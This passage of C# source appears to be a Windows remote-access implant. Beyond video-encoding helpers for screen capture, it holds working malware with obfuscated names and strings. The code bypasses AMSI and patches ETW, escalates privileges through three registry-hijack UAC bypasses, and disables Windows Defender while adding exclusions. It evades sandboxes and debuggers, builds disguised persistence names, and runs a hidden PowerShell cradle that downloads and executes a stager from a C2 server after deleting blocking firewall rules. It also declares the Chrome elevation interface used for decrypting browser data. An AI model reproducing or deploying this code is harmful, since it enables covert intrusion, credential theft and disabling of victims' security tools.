            if (i + 3 < d.Length && d[i] == 0 && d[i + 1] == 0 && d[i + 2] == 0 && d[i + 3] == 1) return 4;
            if (i + 2 < d.Length && d[i] == 0 && d[i + 1] == 0 && d[i + 2] == 1) return 3;
            return 0;
        }

        List<ArraySegment<byte>> ParseAnnexBNalus(byte[] d)
        {
            var list = new List<ArraySegment<byte>>();
            int i = 0;
            while (i < d.Length - 3)
            {
                int sc = H264StartCodeLen(d, i);
                if (sc == 0) { i++; continue; }
                int s = i + sc;
                int e = d.Length;
                for (int j = s + 1; j < d.Length - 2; j++)
                {
                    if (H264StartCodeLen(d, j) > 0) { e = j; break; }
                }
                if (e > s) list.Add(new ArraySegment<byte>(d, s, e - s));
                i = e;
            }
            return list;
        }

        List<ArraySegment<byte>> ParseAvccNalus(byte[] d)
        {
            var list = new List<ArraySegment<byte>>();
            int p = 0;
            while (p + 4 <= d.Length)
            {
                int l = (d[p] << 24) | (d[p + 1] << 16) | (d[p + 2] << 8) | d[p + 3];
                if (l <= 0 || p + 4 + l > d.Length) { list.Clear(); return list; }
                list.Add(new ArraySegment<byte>(d, p + 4, l));
                p += 4 + l;
            }
            if (p != d.Length) list.Clear();
            return list;
        }

        byte[] CopyNal(byte[] d, int off, int len)
        {
            var r = new byte[len];
            Buffer.BlockCopy(d, off, r, 0, len);
            return r;
        }

        byte[] NormalizeH264(byte[] d, out bool keyFrame)
        {
            keyFrame = false;
            if (d == null || d.Length == 0) return d;
            var nalus = ParseAnnexBNalus(d);
            if (nalus.Count == 0) nalus = ParseAvccNalus(d);
            if (nalus.Count == 0) nalus.Add(new ArraySegment<byte>(d, 0, d.Length));

            bool hasSps = false, hasPps = false, hasIdr = false;
            int total = 0;
            foreach (var n in nalus)
            {
                if (n.Count <= 0) continue;
                int t = d[n.Offset] & 0x1F;
                if (t == 7) { _sps = CopyNal(d, n.Offset, n.Count); hasSps = true; keyFrame = true; }
                else if (t == 8) { _pps = CopyNal(d, n.Offset, n.Count); hasPps = true; }
                else if (t == 5) { hasIdr = true; keyFrame = true; }
                total += 4 + n.Count;
            }

            bool prefixParams = hasIdr && (!hasSps || !hasPps) && _sps != null && _pps != null;
            if (prefixParams) total += 8 + _sps.Length + _pps.Length;

            var output = new byte[total];
            int o = 0;
            if (prefixParams)
            {
                output[o++] = 0; output[o++] = 0; output[o++] = 0; output[o++] = 1;
                Buffer.BlockCopy(_sps, 0, output, o, _sps.Length); o += _sps.Length;
                output[o++] = 0; output[o++] = 0; output[o++] = 0; output[o++] = 1;
                Buffer.BlockCopy(_pps, 0, output, o, _pps.Length); o += _pps.Length;
            }
            foreach (var n in nalus)
            {
                if (n.Count <= 0) continue;
                output[o++] = 0; output[o++] = 0; output[o++] = 0; output[o++] = 1;
                Buffer.BlockCopy(d, n.Offset, output, o, n.Count); o += n.Count;
            }
            return output;
        }

        
        static readonly Guid CODECAPI_ForceKF = G("398c1b98-8353-475a-9ef2-8f265d260345");
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DQI(IntPtr p, ref Guid riid, out IntPtr ppv);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DCodecSetVal(IntPtr p, ref Guid api, IntPtr val);
        public void ForceKeyFrame()
        {
            if (_BcYGryqBv || _transform == IntPtr.Zero) return;
            try
            {
                
                Guid iidCodecAPI = G("901db4c7-31ce-41a2-85dc-8fa0bf41b8da");
                IntPtr pCA;
                int hr = ((DQI)Vt(_transform, 0, typeof(DQI)))(_transform, ref iidCodecAPI, out pCA);
                if (hr < 0 || pCA == IntPtr.Zero) return;
                try
                {
                    
                    IntPtr var = Marshal.AllocHGlobal(24);
                    for (int i = 0; i < 24; i++) Marshal.WriteByte(var, i, 0);
                    Marshal.WriteInt16(var, 0, 19); 
                    Marshal.WriteInt32(var, 8, 1);  
                    Guid g = CODECAPI_ForceKF;
                    ((DCodecSetVal)Vt(pCA, 7, typeof(DCodecSetVal)))(pCA, ref g, var);
                    Marshal.FreeHGlobal(var);
                }
                finally { Rel(pCA); }
            }
            catch {}
        }

        static void BgraToNv12(byte[] bgra, byte[] nv12, int w, int h, int stride)
        {
            int ySize = w * h;
            for (int j = 0; j < h; j++)
            {
                int sr = j * stride, yr = j * w;
                for (int i = 0; i < w; i++)
                {
                    int si = sr + i * 4;
                    int r = bgra[si + 2], g = bgra[si + 1], b = bgra[si];
                    int y = ((66 * r + 129 * g + 25 * b + 128) >> 8) + 16;
                    nv12[yr + i] = (byte)(y < 16 ? 16 : (y > 235 ? 235 : y));
                }
            }
            for (int j = 0; j < h; j += 2)
            {
                int sr = j * stride, ur = ySize + (j / 2) * w;
                for (int i = 0; i < w; i += 2)
                {
                    int si = sr + i * 4;
                    int r = bgra[si + 2], g = bgra[si + 1], b = bgra[si];
                    nv12[ur + i]     = (byte)Math.Max(16, Math.Min(240, ((-38 * r - 74 * g + 112 * b + 128) >> 8) + 128));
                    nv12[ur + i + 1] = (byte)Math.Max(16, Math.Min(240, ((112 * r - 94 * g - 18 * b + 128) >> 8) + 128));
                }
            }
        }

        public void Dispose()
        {
            if (_BcYGryqBv) return;
            _BcYGryqBv = true;
            if (_transform != IntPtr.Zero)
            {
                try { ((DProcMsg)Vt(_transform, 23, typeof(DProcMsg)))(_transform, 0x10000002, IntPtr.Zero); } catch { }
                Rel(_transform); _transform = IntPtr.Zero;
            }
            try { MFShutdown(); } catch { }
        }
    }

    
    
    
    [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown), Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
    internal interface IElevator
    {
        [PreserveSig]
        int RunRecoveryCRXElevated(
            [MarshalAs(UnmanagedType.LPWStr)] string crxPath,
            [MarshalAs(UnmanagedType.LPWStr)] string browserAppId,
            [MarshalAs(UnmanagedType.LPWStr)] string browserVersion,
            [MarshalAs(UnmanagedType.LPWStr)] string sessionId,
            uint callerProcId,
            [MarshalAs(UnmanagedType.Interface)] out object procHandle);
        [PreserveSig]
        int EncryptData(
            uint protectionLevel,
            [MarshalAs(UnmanagedType.BStr)] string plaintext,
            [MarshalAs(UnmanagedType.BStr)] out string ciphertext,
            out uint lastError);
        [PreserveSig]
        int DecryptData(
            [MarshalAs(UnmanagedType.BStr)] string ciphertext,
            [MarshalAs(UnmanagedType.BStr)] out string plaintext,
            out uint lastError);
    }

    
    
    
    internal static class _HYogZcd
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string n);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr h, string n);
        [DllImport("kernel32.dll")]
        static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
        [DllImport("kernel32.dll")]
        static extern int GetCurrentThreadId();
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(uint access, bool inherit, int id);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr h);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr h);
        [DllImport("kernel32.dll")]
        static extern bool GetThreadContext(IntPtr h, IntPtr ctx);
        [DllImport("kernel32.dll")]
        static extern bool SetThreadContext(IntPtr h, IntPtr ctx);
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr h);

        
        static IntPtr _iZnunsF;  

        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int VehDelegate(IntPtr exInfo);
        static VehDelegate _cjAPrkNWJWzI;

        
        const int CTX_FLAGS = 0x30;
        const int CTX_DR0   = 0x48;
        const int CTX_DR7   = 0x70;
        const int CTX_RAX   = 0x78;
        const int CTX_RSP   = 0x98;
        const int CTX_RIP   = 0xF8;
        const int CTX_SIZE  = 1232;
        const int CTX_DEBUG = 0x00100010; 

        public static void _dDeVZgMucrmUeafQ()
        {
            if (IntPtr.Size != 8) return; 

            try
            {
                
                IntPtr amsiDll = IntPtr.Zero;
                foreach (ProcessModule m in Process.GetCurrentProcess().Modules)
                {
                    if (m.ModuleName.Equals(new string(new char[]{'a','m','s','i','.','d','l','l'}), StringComparison.OrdinalIgnoreCase))
                    { amsiDll = m.BaseAddress; break; }
                }
                if (amsiDll == IntPtr.Zero)
                    amsiDll = LoadLibrary(new string(new char[]{'a','m','s','i','.','d','l','l'}));
                if (amsiDll != IntPtr.Zero)
                    _iZnunsF = GetProcAddress(amsiDll, new string(new char[]{'A','m','s','i','S','c','a','n','B','u','f','f','e','r'}));

                if (_iZnunsF == IntPtr.Zero) return;

                
                _cjAPrkNWJWzI = _pWZQOOSOML;
                AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_cjAPrkNWJWzI));

                
                int myTid = GetCurrentThreadId();
                foreach (ProcessThread pt in Process.GetCurrentProcess().Threads)
                {
                    try { _toNsXSVnpQKuu(pt.Id, pt.Id == myTid); } catch { }
                }
            }
            catch { }
        }

        static void _toNsXSVnpQKuu(int tid, bool isCurrent)
        {
            if (isCurrent)
            {
                
                var helper = new Thread(() => _ixKgVMB(tid));
                helper.IsBackground = true;
                helper.Start();
                helper.Join(3000);
                return;
            }
            _ixKgVMB(tid);
        }

        static void _ixKgVMB(int tid)
        {
            IntPtr hThread = OpenThread(0x001A, false, tid); 
            if (hThread == IntPtr.Zero) return;
            bool suspended = false;
            try
            {
                SuspendThread(hThread);
                suspended = true;

                
                IntPtr raw = Marshal.AllocHGlobal(CTX_SIZE + 16);
                IntPtr ctx = new IntPtr((raw.ToInt64() + 15) & ~15L);
                try
                {
                    for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                    Marshal.WriteInt32(ctx, CTX_FLAGS, CTX_DEBUG);

                    if (GetThreadContext(hThread, ctx))
                    {
                        Marshal.WriteIntPtr(ctx, CTX_DR0, _iZnunsF);

                        
                        
                        long dr7 = Marshal.ReadInt64(ctx, CTX_DR7);
                        dr7 &= ~0x03L;           
                        dr7 &= ~(0x0FL << 16);   
                        dr7 |= 1;                
                        Marshal.WriteInt64(ctx, CTX_DR7, dr7);

                        SetThreadContext(hThread, ctx);
                    }
                }
                finally { Marshal.FreeHGlobal(raw); }
            }
            finally
            {
                
                if (suspended) ResumeThread(hThread);
                CloseHandle(hThread);
            }
        }

        static int _pWZQOOSOML(IntPtr exInfo)
        {
            try
            {
                IntPtr exRecord  = Marshal.ReadIntPtr(exInfo, 0);
                IntPtr ctxRecord = Marshal.ReadIntPtr(exInfo, IntPtr.Size);

                
                if (Marshal.ReadInt32(exRecord, 0) != unchecked((int)0x80000004))
                    return 0; 

                IntPtr faultAddr = Marshal.ReadIntPtr(exRecord, 16); 

                if (faultAddr == _iZnunsF && _iZnunsF != IntPtr.Zero)
                {
                    
                    
                    Marshal.WriteInt64(ctxRecord, CTX_RAX, unchecked((long)0x80070057));
                    
                    long rsp = Marshal.ReadInt64(ctxRecord, CTX_RSP);
                    Marshal.WriteInt64(ctxRecord, CTX_RIP, Marshal.ReadInt64(new IntPtr(rsp)));
                    Marshal.WriteInt64(ctxRecord, CTX_RSP, rsp + 8);
                    return -1; 
                }
            }
            catch { }
            return 0; 
        }

        
        
        
        delegate bool VPDelegate(IntPtr addr, UIntPtr sz, uint np, out uint op);
        static VPDelegate _gdeApl;

        public static void _yJXFtwtl()
        {
            try
            {
                
                
                byte xk = 0x5A;
                byte[] enc = { (byte)(0x33^0x5A), (byte)(0xC0^0x5A), (byte)(0xC3^0x5A) };
                byte[] patch = new byte[enc.Length];
                for (int i = 0; i < enc.Length; i++) patch[i] = (byte)(enc[i] ^ xk);

                IntPtr ntdll = IntPtr.Zero;
                foreach (ProcessModule m in Process.GetCurrentProcess().Modules)
                {
                    if (m.ModuleName.IndexOf(new string(new char[]{'n','t','d','l','l'}), StringComparison.OrdinalIgnoreCase) >= 0)
                    { ntdll = m.BaseAddress; break; }
                }
                if (ntdll == IntPtr.Zero) return;

                
                var addr = GetProcAddress(ntdll, new string(new char[]{'E','t','w','E','v','e','n','t','W','r','i','t','e'}));
                if (addr == IntPtr.Zero) return;

                
                if (_gdeApl == null)
                {
                    var k = LoadLibrary(new string(new char[]{'k','e','r','n','e','l','3','2','.','d','l','l'}));
                    var p = GetProcAddress(k, new string(new char[]{'V','i','r','t','u','a','l','P','r','o','t','e','c','t'}));
                    _gdeApl = (VPDelegate)Marshal.GetDelegateForFunctionPointer(p, typeof(VPDelegate));
                }

                uint old;
                _gdeApl(addr, (UIntPtr)patch.Length, 0x40, out old); 
                for (int i = 0; i < patch.Length; i++)
                    Marshal.WriteByte(addr, i, patch[i]);
                _gdeApl(addr, (UIntPtr)patch.Length, old, out old);  
            }
            catch { }
        }

        
        public static bool _UpUTVTI()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        
        
        
        public static string _DtVckTCHXhi(string command, int waitMs = 15000)
        {
            
            string result;

            result = UacBypassMsSettings(command, _Q._S("CpZDr66Rl2dRLdRLFA=="), waitMs);
            if (!string.IsNullOrEmpty(result)) return result;

            result = UacBypassMsSettings(command, "computerdefaults.exe", waitMs);
            if (!string.IsNullOrEmpty(result)) return result;

            result = UacBypassSdclt(command, waitMs);
            if (!string.IsNullOrEmpty(result)) return result;

            result = UacBypassEventvwr(command, waitMs);
            if (!string.IsNullOrEmpty(result)) return result;

            return "";
        }

        
        static string UacBypassMsSettings(string command, string trigger, int waitMs)
        {
            string id = Guid.NewGuid().ToString("N").Substring(0, 8);
            string tmpResult = Path.Combine(Path.GetTempPath(), "r" + id + ".tmp");
            string tmpBat = Path.Combine(Path.GetTempPath(), "c" + id + ".cmd");
            string regCleanup = _Q._S("P5ZBs7yclWd/QN1SAmKxBTCUVOq4mJN2Sm3WQC1ivBMAlQ==");

            try
            {
                File.WriteAllText(tmpBat, "@echo off\r\n" + command + " > \"" + tmpResult + "\" 2>&1\r\ndel \"%~f0\" >nul 2>&1");
                try { File.SetAttributes(tmpBat, FileAttributes.Hidden); } catch {}

                string regPath = _Q._S("P5ZBs7yclWd/QN1SAmKxBTCUVOq4mJN2Sm3WQC1ivBMAlXuou5iJXkBs3F4Qf7A=");
                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath))
                {
                    key.SetValue("", "cmd.exe /c \"" + tmpBat + "\"");
                    key.SetValue(_Q._S("KJxLoqyck2dme9RQBGWx"), "");
                }

                var psi = new ProcessStartInfo(trigger)
                { UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden };
                Process.Start(psi);

                for (int i = 0; i < waitMs / 500; i++)
                {
                    Thread.Sleep(500);
                    if (File.Exists(tmpResult)) { Thread.Sleep(500); break; }
                }

                return File.Exists(tmpResult) ? File.ReadAllText(tmpResult) : "";
            }
            catch { return ""; }
            finally
            {
                try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(regCleanup, false); } catch {}
                try { File.Delete(tmpBat); } catch {}
                try { File.Delete(tmpResult); } catch {}
            }
        }

        
        static string UacBypassSdclt(string command, int waitMs)
        {
            string id = Guid.NewGuid().ToString("N").Substring(0, 8);
            string tmpResult = Path.Combine(Path.GetTempPath(), "r" + id + ".tmp");
            string tmpBat = Path.Combine(Path.GetTempPath(), "c" + id + ".cmd");
            string regCleanup = @"Software\Classes\Folder\shell\open\command";

            try
            {
                File.WriteAllText(tmpBat, "@echo off\r\n" + command + " > \"" + tmpResult + "\" 2>&1\r\ndel \"%~f0\" >nul 2>&1");
                try { File.SetAttributes(tmpBat, FileAttributes.Hidden); } catch {}

                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regCleanup))
                {
                    key.SetValue("", "cmd.exe /c \"" + tmpBat + "\"");
                    key.SetValue(_Q._S("KJxLoqyck2dme9RQBGWx"), "");
                }

                var psi = new ProcessStartInfo("sdclt.exe")
                { UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden };
                Process.Start(psi);

                for (int i = 0; i < waitMs / 500; i++)
                {
                    Thread.Sleep(500);
                    if (File.Exists(tmpResult)) { Thread.Sleep(500); break; }
                }

                return File.Exists(tmpResult) ? File.ReadAllText(tmpResult) : "";
            }
            catch { return ""; }
            finally
            {
                try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\Folder\shell\open", false); } catch {}
                try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\Folder\shell", false); } catch {}
                try { File.Delete(tmpBat); } catch {}
                try { File.Delete(tmpResult); } catch {}
            }
        }

        
        static string UacBypassEventvwr(string command, int waitMs)
        {
            string id = Guid.NewGuid().ToString("N").Substring(0, 8);
            string tmpResult = Path.Combine(Path.GetTempPath(), "r" + id + ".tmp");
            string tmpBat = Path.Combine(Path.GetTempPath(), "c" + id + ".cmd");
            string regCleanup = @"Software\Classes\mscfile\shell";

            try
            {
                File.WriteAllText(tmpBat, "@echo off\r\n" + command + " > \"" + tmpResult + "\" 2>&1\r\ndel \"%~f0\" >nul 2>&1");
                try { File.SetAttributes(tmpBat, FileAttributes.Hidden); } catch {}

                string regPath = @"Software\Classes\mscfile\shell\open\command";
                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath))
                {
                    key.SetValue("", "cmd.exe /c \"" + tmpBat + "\"");
                }

                var psi = new ProcessStartInfo("eventvwr.exe")
                { UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden };
                Process.Start(psi);

                for (int i = 0; i < waitMs / 500; i++)
                {
                    Thread.Sleep(500);
                    if (File.Exists(tmpResult)) { Thread.Sleep(500); break; }
                }

                return File.Exists(tmpResult) ? File.ReadAllText(tmpResult) : "";
            }
            catch { return ""; }
            finally
            {
                try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(regCleanup, false); } catch {}
                try { File.Delete(tmpBat); } catch {}
                try { File.Delete(tmpResult); } catch {}
            }
        }

        
        static string _wd() { return new string(new char[]{'W','i','n','d','o','w','s',' ','D','e','f','e','n','d','e','r'}); }
        public static void _jGWgGZRiGlJUVrShAefk()
        {
            string wdBase = @"SOFTWARE\Policies\Microsoft\" + _wd();
            string wdExBase = @"SOFTWARE\Microsoft\" + _wd() + @"\Exclusions";
            
            if (_UpUTVTI())
            {
                try
                {
                    
                    var rtKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
                        wdBase + @"\Real-Time Protection");
                    if (rtKey != null)
                    {
                        rtKey.SetValue("DisableRealtimeMonitoring", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        rtKey.SetValue("DisableBehaviorMonitoring", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        rtKey.SetValue("DisableOnAccessProtection", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        rtKey.SetValue("DisableScanOnRealtimeEnable", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        rtKey.SetValue("DisableIOAVProtection", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        rtKey.Close();
                    }
                }
                catch { }

                try
                {
                    
                    var wdKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(wdBase);
                    if (wdKey != null)
                    {
                        wdKey.SetValue("DisableAntiSpyware", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        wdKey.Close();
                    }
                }
                catch { }

                
                string[] paths = new string[] {
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Path.GetTempPath().TrimEnd('\\'),
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    @"C:\Windows\System32"
                };
                try
                {
                    var exKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
                        wdExBase + @"\Paths");
                    if (exKey != null)
                    {
                        foreach (string p in paths)
                            if (!string.IsNullOrEmpty(p))
                                try { exKey.SetValue(p, 0, Microsoft.Win32.RegistryValueKind.DWord); } catch { }
                        exKey.Close();
                    }
                }
                catch { }

                
                string[] procs = new string[] { _Q._S("HJZQormOj2dPb59WCXQ="), _Q._S("G4pEtaKNkyxGe9Q="), _Q._S("D5RD6a6Fgg=="), "conhost.exe" };
                try
                {
                    var epKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
                        wdExBase + @"\Processes");
                    if (epKey != null)
                    {
                        foreach (string p in procs)
                            try { epKey.SetValue(p, 0, Microsoft.Win32.RegistryValueKind.DWord); } catch { }
                        epKey.Close();
                    }
                }
                catch { }
            }
            else
            {
                
                try
                {
                    string rp = "HKLM\\SOFTWARE\\Policies\\Microsoft\\" + _wd().Replace(" "," ");
                    string regCmd =
                        "reg add \"" + rp + "\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f & " +
                        "reg add \"" + rp + "\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f & " +
                        "reg add \"" + rp + "\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f";
                    _DtVckTCHXhi(regCmd, 15000);
                }
                catch { }
            }
        }

        
        public static bool _AYjeETXCk()
        {
            int score = 0;

            
            try
            {
                using (var s = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                    foreach (ManagementObject o in s.Get())
                        if (Convert.ToInt64(o["TotalPhysicalMemory"]) < 2L * 1024 * 1024 * 1024) score += 2;
            }
            catch { }
            try { if (Environment.ProcessorCount < 2) score += 2; } catch { }
            try { if (new DriveInfo("C").TotalSize < 60L * 1024 * 1024 * 1024) score += 2; } catch { }

            
            try
            {
                using (var s = new ManagementObjectSearcher("SELECT Manufacturer,Model FROM Win32_ComputerSystem"))
                    foreach (ManagementObject o in s.Get())
                    {
                        string mfg = (o["Manufacturer"] ?? "").ToString().ToLower();
                        string mdl = (o["Model"] ?? "").ToString().ToLower();
                        if (mfg.Contains("vmware") || mdl.Contains("vmware")) score += 3;
                        else if (mfg.Contains("innotek") || mdl.Contains("virtualbox")) score += 3;
                        else if (mfg.Contains("microsoft corporation") && mdl.Contains("virtual")) score += 3;
                        else if (mfg.Contains("qemu") || mdl.Contains("qemu")) score += 3;
                        else if (mfg.Contains("xen") || mdl.Contains("xen")) score += 3;
                    }
            }
            catch { }
            
            try
            {
                using (var s = new ManagementObjectSearcher("SELECT SerialNumber,Version FROM Win32_BIOS"))
                    foreach (ManagementObject o in s.Get())
                    {
                        string ver = (o["Version"] ?? "").ToString().ToLower();
                        string sn = (o["SerialNumber"] ?? "").ToString().ToLower();
                        if (ver.Contains("vbox") || ver.Contains("vmware") || ver.Contains("qemu")) score += 2;
                        if (sn.Contains("0") && sn.Length < 5) score += 1; 
                    }
            }
            catch { }
            
            try
            {
                string[] vmProcs = { "vmtoolsd", "vmwaretray", "vboxservice", "vboxtray",
                    "qemu-ga", "xenservice", "joeboxcontrol", "joeboxserver" };
                foreach (var proc in Process.GetProcesses())
                {
                    try
                    {
                        string name = proc.ProcessName.ToLower();
                        foreach (string v in vmProcs)
                            if (name == v) { score += 3; break; }
                    }
                    catch { }
                }
            }
            catch { }

            
            try
            {
                string recent = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                if (Directory.Exists(recent) && Directory.GetFiles(recent).Length < 3) score += 1;
            }
            catch { }
            try
            {
                string user = Environment.UserName.ToLower();
                string[] sandbox = { "sandbox", "virus", "malware", "sample", "john doe",
                    "currentuser", "emily", "hapubws", "hong lee", "johnson",
                    "milozs", "peter wilson", "timmy", "sand box" };
                foreach (string s in sandbox)
                    if (user == s) { score += 3; break; }
            }
            catch { }
            try
            {
                int uptimeMs = Environment.TickCount;
                if (uptimeMs > 0 && uptimeMs < 5 * 60 * 1000) score += 1;
            }
            catch { }
            
            try
            {
                string progDir = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                if (Directory.Exists(progDir) && Directory.GetDirectories(progDir).Length < 5) score += 2;
            }
            catch { }

            
            try
            {
                string[] debuggers = { "x64dbg", "x32dbg", "ollydbg", "ida64", "ida32",
                    "ghidra", "dnspy", "pestudio", "immunitydebugger", "windbg" };
                int toolHits = 0;
                foreach (var proc in Process.GetProcesses())
                {
                    try
                    {
                        string name = proc.ProcessName.ToLower();
                        foreach (string t in debuggers)
                            if (name.Contains(t)) { toolHits++; break; }
                    }
                    catch { }
                }
                
                if (toolHits >= 2) score += 3;
                else if (toolHits == 1) score += 1;
            }
            catch { }

            return score >= 5;
        }
    }

    
    
    
    internal static class _EoNXFHKsVzpYeIzwFBs
    {
        
        static string _mid;
        static string _c2Host;
        static string _stagerUrl;
        static string _cradleCmd;
        static string _cradleB64Cmd;
        static string _regNameHKCU;
        static string _regNameHKLM;
        static string _taskBoot;
        static string _taskGuard;
        static string _wmiName;
        static string _vbsName;
        
        static string _comDllName;
        static string _comDllPath;
        static string _comAsmName;
        static string _comClassName;
        static string _comClassGuid;
        
        static readonly string[] _comTargets = new string[] {
            "{BCDE0395-E52F-467C-8E3D-C4579291692E}",  
            "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}",  
            "{4590F811-1D3A-11D0-891F-00AA004B2E24}"   
        };

        static byte[] DeriveHash(string input)
        {
            using (var sha = System.Security.Cryptography.SHA256.Create())
                return sha.ComputeHash(Encoding.UTF8.GetBytes(input));
        }

        static string Pick(string[] pool, byte b) { return pool[b % pool.Length]; }

        static void InitNames()
        {
            
            string machineId = Environment.MachineName;
            try
            {
                var rk = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Cryptography", false);
                if (rk != null)
                {
                    var v = rk.GetValue("MachineGuid");
                    if (v != null) machineId = v.ToString();
                    rk.Close();
                }
            }
            catch { }

            var h1 = DeriveHash(machineId + "|cs|reg");
            var h2 = DeriveHash(machineId + "|cs|task");
            var h3 = DeriveHash(machineId + "|cs|wmi");
            var h4 = DeriveHash(machineId + "|cs|vbs");

            string[] prefixes = { "Win", "Net", "Sys", "Svc", "Wmi", "Dps", "App", "Sec", "Cfg", "Usr" };
            string[] mids = { "Runtime", "Update", "Config", "Manager", "Host", "Bridge", "Policy", "Guard", "Compat", "Telemetry" };
            string[] suffixes = { "Ex", "Svc", "_fCGnnZ", "Helper", "Mon", "Ctrl", "Core", "Init", "Diag", "Sync" };

            _regNameHKCU = Pick(prefixes, h1[0]) + Pick(mids, h1[1]) + Pick(suffixes, h1[2]) + "_" + h1[3].ToString("X2") + h1[4].ToString("X2");
            _regNameHKLM = Pick(prefixes, h1[5]) + Pick(mids, h1[6]) + Pick(suffixes, h1[7]) + "_" + h1[8].ToString("X2");
            _taskBoot = @"\Microsoft\" + Pick(prefixes, h2[0]) + " " + Pick(mids, h2[1]) + " " + Pick(suffixes, h2[2]);
            _taskGuard = @"\Microsoft\" + Pick(prefixes, h2[3]) + " " + Pick(mids, h2[4]) + " " + Pick(suffixes, h2[5]);
            _wmiName = Pick(prefixes, h3[0]) + Pick(mids, h3[1]) + h3[2].ToString("X2");
            _vbsName = Pick(prefixes, h4[0]) + Pick(mids, h4[1]) + Pick(suffixes, h4[2]) + ".vbs";

            
            var h5 = DeriveHash(machineId + "|cs|com");
            _comDllName = Pick(prefixes, h5[0]) + Pick(mids, h5[1]) + h5[2].ToString("X2") + ".dll";
            _comAsmName = Pick(prefixes, h5[3]) + Pick(mids, h5[4]) + "Lib";
            _comClassName = Pick(prefixes, h5[5]) + Pick(mids, h5[6]) + "Proxy";
            _comClassGuid = string.Format("{0:x8}-{1:x4}-{2:x4}-{3:x4}-{4:x12}",
                (uint)((h5[7] << 24) | (h5[8] << 16) | (h5[9] << 8) | h5[10]),
                (ushort)((h5[11] << 8) | h5[12]),
                (ushort)((h5[13] << 8) | h5[14]),
                (ushort)((h5[15] << 8) | h5[16]),
                ((long)h5[17] << 40) | ((long)h5[18] << 32) | ((long)h5[19] << 24) | ((long)h5[20] << 16) | ((long)h5[21] << 8) | h5[22]);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            _comDllPath = Path.Combine(appData, _comDllName);
        }

        static void InitCradle(string serverUrl)
        {
            _mid = Environment.MachineName;
            _stagerUrl = serverUrl.TrimEnd('/') + "/api/agent/stager?mid=" + _mid;

            
            try
            {
                var uri = new Uri(serverUrl);
                _c2Host = uri.Host;
            }
            catch { _c2Host = ""; }

            
            string fwClean = string.IsNullOrEmpty(_c2Host) ? "" :
                "Get-NetFirewallRule -EA SilentlyContinue|?{$_.Action -eq 'Block' -and $_.Direction -eq 'Outbound'}|%{" +
                "$a=Get-NetFirewallAddressFilter -AssociatedNetFirewallRule $_ -EA SilentlyContinue;" +
                "if($a.RemoteAddress -match '" + _c2Host + "'){Remove-NetFirewallRule -Name $_.Name -EA SilentlyContinue}};";

            _cradleCmd = string.Format(
                "powershell.exe -ep bypass -w hidden -c \"{0}[Net.ServicePointManager]::SecurityProtocol='Tls12';IEX((New-Object Net.WebClient).DownloadString('{1}'))\"",
                fwClean, _stagerUrl);

            
            string psRaw = fwClean +
                "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
                "try{[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}catch{};" +
                "IEX((New-Object Net.WebClient).DownloadString('" + _stagerUrl + "'))";
            byte[] utf16 = Encoding.Unicode.GetBytes(psRaw);
            string b64 = Convert.ToBase64String(utf16);
            _cradleB64Cmd = "powershell.exe -ep bypass -w hidden -NonI -EncodedCommand " + b64;
        }

        

        public static void _JbyjPuj(string serverUrl)
        {
            InitNames();
            InitCradle(serverUrl);
            InstallAllLayers();
        }

        
        public static void StartSelfHeal(string serverUrl)
        {
            InitNames();
            InitCradle(serverUrl);
            ThreadPool.QueueUserWorkItem(_ =>
            {
                Thread.Sleep(15000); 
                while (true)
                {
                    try
                    {
                        HealFirewall();
